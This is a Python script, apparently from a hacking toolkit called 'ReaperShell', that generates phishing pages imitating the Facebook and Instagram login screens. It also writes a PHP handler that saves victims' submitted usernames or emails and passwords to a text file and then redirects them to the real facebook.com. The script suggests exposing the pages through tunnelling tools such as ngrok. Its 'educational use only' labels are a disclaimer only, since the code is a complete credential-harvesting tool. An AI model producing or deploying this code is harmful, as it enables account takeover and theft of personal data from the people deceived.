#!/usr/bin/env python3
# phishing_page-gen.py - ReaperShell Phishing Page Generator (Educational Use Only)
# Author: KERILL-REDBYTEV

import os

TEMPLATES = {
    "1": {
        "name": "Facebook Login",
        "html": """
<!DOCTYPE html>
<html>
<head><title>Facebook</title></head>
<body>
    <h2 style="color:#1877f2;">Facebook Login</h2>
    <form method="POST" action="login.php">
        <input type="text" name="email" placeholder="Email or Phone"><br><br>
        <input type="password" name="password" placeholder="Password"><br><br>
        <input type="submit" value="Log In">
    </form>
</body>
</html>
"""
    },
    "2": {
        "name": "Instagram Login",
        "html": """
<!DOCTYPE html>
<html>
<head><title>Instagram</title></head>
<body>
    <h2 style="color:#c13584;">Instagram Login</h2>
    <form method="POST" action="login.php">
        <input type="text" name="username" placeholder="Username"><br><br>
        <input type="password" name="password" placeholder="Password"><br><br>
        <input type="submit" value="Log In">
    </form>
</body>
</html>
"""
    }
}

def generate_login_php():
    return """<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = fopen("creds.txt", "a");
    fwrite($file, "User: " . $_POST["email"] . $_POST["username"] . "\\n");
    fwrite($file, "Pass: " . $_POST["password"] . "\\n\\n");
    fclose($file);
    header("Location: https://facebook.com"); // Redirect
    exit();
}
?>
"""

def main():
    print("========================================")
    print("   ReaperShell - Phishing Page Generator")
    print("========================================\n")

    for key, val in TEMPLATES.items():
        print(f"[{key}] {val['name']}")

    choice = input("\nSelect template: ").strip()

    if choice not in TEMPLATES:
        print("[!] Invalid choice.")
        return

    folder = input("Enter folder name to generate files in (e.g., fb_phish): ").strip()
    if not folder:
        print("[!] Folder name cannot be empty.")
        return

    os.makedirs(folder, exist_ok=True)

    html_content = TEMPLATES[choice]["html"]
    php_content = generate_login_php()

    with open(os.path.join(folder, "index.html"), "w") as html_file:
        html_file.write(html_content)

    with open(os.path.join(folder, "login.php"), "w") as php_file:
        php_file.write(php_content)

    print(f"\n[+] Phishing page '{TEMPLATES[choice]['name']}' generated in: {folder}/")
    print("[*] Use with localhost or tunnel tools like ngrok (educational use only).")
    input("\nPress ENTER to return to menu...")

if __name__ == "__main__":
    main()